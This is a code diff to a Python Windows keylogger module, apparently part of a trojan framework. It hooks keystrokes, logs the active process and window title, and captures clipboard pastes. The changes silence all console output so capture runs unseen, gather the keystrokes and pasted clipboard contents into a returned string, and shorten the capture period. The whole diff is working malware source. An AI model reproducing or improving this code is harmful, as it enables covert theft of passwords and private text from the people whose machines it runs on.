@@ -5,7 +5,7 @@ import win32clipboard
 import time
 
 start = time.time()
-PERIOD_OF_TIME = 60
+PERIOD_OF_TIME = 15
 
 user32 = windll.user32
 kernel32 = windll.kernel32
@@ -34,7 +34,7 @@ def get_current_process():
     length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
 
     #print("[*] In keyLog module")
-    print("[->] PID: %s - %s - %s " % (process_id, executable.value, window_title.value))
+    #print("[->] PID: %s - %s - %s " % (process_id, executable.value, window_title.value))
     data += "[->] PID: %s - %s - %s " % (process_id, executable.value, window_title.value)
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
@@ -50,7 +50,7 @@ def KeyStroke(event):
         get_current_process()
 
     if event.Ascii > 32 and event.Ascii < 127:
-        print(chr(event.Ascii))
+        #print(chr(event.Ascii))
         data += chr(event.Ascii)
     else:
 
@@ -60,9 +60,11 @@ def KeyStroke(event):
             pasted_value = win32clipboard.GetClipboardData()
             win32clipboard.CloseClipboard()
 
-            print("[PASTE] - %s" % pasted_value)
+            #print("[PASTE] - %s" % pasted_value)
+            data += ("[PASTE] - %s" % pasted_value)
         else:
-            print("[%s]" % event.Key)
+            #print("[%s]" % event.Key)
+            data += ("[%s]" % event.Key)
 
     return True
 
@@ -80,4 +82,5 @@ def run(**args):
         pythoncom.PumpWaitingMessages()
         if time.time() > start + PERIOD_OF_TIME : break
 
+    #rint(str(data))
     return str(data)
